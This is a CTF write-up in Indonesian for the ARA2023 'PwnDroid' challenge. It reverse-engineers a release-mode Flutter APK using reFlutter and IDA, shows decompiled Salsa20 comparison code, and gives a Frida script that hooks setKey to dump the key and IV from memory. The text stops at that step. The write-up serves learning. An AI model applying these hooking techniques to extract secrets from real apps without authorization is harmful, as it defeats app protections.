FLAG: ARA2023{w0w_did_y0u_f1nd_m3_in_th3_m3m0ry_4nd_u_dUmP_m3?}

## PwnDroid (Solved after the competition ends)
## Description
Another real-world bad mobile dev perspective so he got an unbreakable Schrödinger-cryptic puzzle APK. Give me the secrets!
## Technical Review
(Disini saya hanya akan memberikan step-by-step cara solve yang saya lakukan, tidak dengan semua attempt yang saya coba, karena saya sendiri menghabiskan hampir 1 hari mencoba berbagai macam cara yang gagal)

Diberikan sebuah APK Android, yang dimana ketika saya analisa lebih lanjut, aplikasi ini menggunakan `Flutter` sebagai kode utama dari aplikasi tersebut. Sayangnya disini aplikasi tersebut di-_build_ dengan `release mode`, menyebabkan tidak adaknya _kernel blob.bin_ yang memudahkan kita dalam menganalisa aplikasi ini.

Pada dasarnya aplikasi ini meminta kita untuk memasukkan flag dari user dan melakukan perbandingan flag tersebut dengan flag aslinya.

Karena disini aplikasi di-_build_ dengan `release mode`, kode-kode pada aplikasi tidak berada pada `kernel_blob.bin`, namun di-_compile_ menuju `libapp.so`. Untuk memecahkan masalah ini, kita bisa menggunakan [reFlutter](https://github.com/Impact-I/reFlutter) untuk mendapatkan informasi mengenai fungsi fungsi yang ada pada aplikasi ini. Setelah aplikasi kita patch menggunakan `reFlutter`, lakukan _sign_ pada APK-nya dan install pada emulator, karena kita perlu mengakses file internal untuk mengambil `dump.dart` atau file yang telah didump oleh aplikasi yang telah kita patch.

Setelah itu, saya menggunakan menggunakan source [berikut](https://github.com/Guardsquare/flutter-re-demo/blob/main/) untuk mendapatkan script yang nantinya bisa kita load di ida pro, script ini bertujuan untuk me-rename semua fungsi pada IDA untuk memudahkan proses analisa.

Before Script:
![](https://i.imgur.com/GtuW6el.png)

After Script:
![](https://i.imgur.com/8Bz2Fwt.png)

Disini langsung saya terpaku dengan beberapa fungsi berikut:
![](https://i.imgur.com/0zcddIC.png)


Setelah diteliti lebih lanjut, aplikasi ini menggunakan `Salsa20` sebagai perlindungan pada string. Setelah beberapa percakapan dengan Problem Setter, diketahui bahwa flag-nya ternyata tersimpan pada `libapp.so` secara statis, lebih tepatnya diformat dalam `base64`, dan benar saja, terdapat sebuah string yang panjang dengan format `base64`:![](https://i.imgur.com/b97K1Er.png)

Jika kita ikuti fungsi `Encrypt`, maka k
```c
bool __fastcall MyHomePageState(__int64 a1, __int64 a2)
{
  __int64 v2; // x15
  __int64 v3; // x22
  __int64 v4; // x26
  __int64 v5; // x27
  __int64 v6; // x29
  __int64 v7; // x30
  _QWORD *v8; // x29
  __int64 v9; // x15
  __int64 v10; // x0
  __int64 v11; // x15
  __int64 v12; // x16
  __int64 v13; // x0
  __int64 v14; // x15
  __int64 v15; // x1
  __int64 v16; // x0
  __int64 v17; // x0
  __int64 v18; // x15
  __int64 v19; // x0
  __int64 v20; // x1
  __int64 v21; // x0
  __int64 v22; // x0
  __int64 v23; // x15
  __int64 v24; // x0
  __int64 v25; // x15
  __int64 v26; // x0
  __int64 v27; // x15
  __int64 v28; // x16
  __int64 v29; // x1

  *(_QWORD *)(v2 - 0x10) = v6;
  *(_QWORD *)(v2 - 8) = v7;
  v8 = (_QWORD *)(v2 - 0x10);
  if ( (unsigned __int64)(v2 - 0x30) <= *(_QWORD *)(v4 + 0x38) )
    sub_3BAEDC(a1, a2);
  v8[0xFFFFFFFF] = sub_2F8BB8();
  *(_DWORD *)(v8[0xFFFFFFFF] + 7LL) = sub_3BA9EC();
  *(_QWORD *)(v9 - 8) = v8[2];
  v9 -= 8LL;
  *(_QWORD *)(v9 - 0x10) = v3;
  *(_QWORD *)(v9 - 8) = 0LL;
  *(_QWORD *)(v9 - 0x18) = v3;
  v10 = StringBase();
  v11 += 0x20LL;
  v12 = *(_QWORD *)(v5 + 0x5B0);
  *(_QWORD *)(v11 - 0x10) = v10;
  *(_QWORD *)(v11 - 8) = v12;
  v13 = Codec::encode();
  v14 += 0x10LL;
  *(_QWORD *)(v14 - 0x10) = v13;
  *(_QWORD *)(v14 - 8) = v3;
  v8[0xFFFFFFFE] = Uint8List::Uint8List_fromList();
  v15 = sub_2F8BA8();
  v16 = v8[0xFFFFFFFE];
  v8[0xFFFFFFFD] = v15;
  *(_DWORD *)(v15 + 7) = v16;
  v17 = sub_2F8B98();
  v8[0xFFFFFFFE] = v17;
  *(_QWORD *)(v18 - 8) = v17;
  v19 = Salsa20Engine::Salsa20Engine_();
  v20 = sub_2F8A64(v19);
  v21 = v8[0xFFFFFFFE];
  v8[0xFFFFFFFC] = v20;
  *(_DWORD *)(v20 + 0xB) = v21;
  *(_DWORD *)(v20 + 7) = v8[0xFFFFFFFF];
  v22 = sub_2F8A54();
  *(_DWORD *)(v22 + 7) = v8[0xFFFFFFFC];
  *(_QWORD *)(v23 - 0x10) = v8[3];
  *(_QWORD *)(v23 - 8) = v22;
  *(_QWORD *)(v23 - 0x18) = v8[0xFFFFFFFD];
  v24 = Encrypter::encrypt();
  *(_QWORD *)(v25 + 0x10) = v24;
  v26 = Encrypted::get::base64();
  v27 += 8LL;
  v28 = v8[4];
  *(_QWORD *)(v27 - 0x10) = v26;
  *(_QWORD *)(v27 - 8) = v28;
  return 2 * MyHomePageState(v26, v29) == 2;
}
```
Bisa dilihat bahwa disini ketika string sudah diencrypt dan dijadikan `base64`, akan ada sebuah fungsi yang membandikan hasil `base64` tersebut dengan flag-nya (yang dimana disini sudah menjadi `base64`)

Jadi intinya, string hasil input kita akan diencrypt dengan cipher Salsa20, lalu dijadikan `base64` dan dibandingkan dengan flag yang telah diencrypt dan dijadikan `base64` juga secara statis.

Karena kita sudah memiliki flag dan tipe enkripsinya, kita cukup mencari `Key` dan `IV` untuk melakukan dekripsi pada flag. Untuk melakukan leak, disini saya akan melakukan hook pada fungsi `Salsa20Engine::setKey(Key, IV)`

Disini saya akan menggunakan `frida` untuk melakukan hook pada fungsi tersebut, berikut script yang digunakan:
```js
function run() {
    var app = Module.findBaseAddress("libapp.so")
    Interceptor.attach(app.add(0x2F67AC), {
        onEnter: function(args) {
            console.log(this.returnAddress.sub(app));
            console.log(hexdump(args[0]));
            console.log(hexdump(args[1]));
        },
        onLeave: function(retval) {
            console.log(hexdump(retval));
        }
    });
}
run();
```
Script tersebut akan melakukan hook pada fungsi `setKey` dan melakukan dump guna mencari Key dan IV yang dicari.

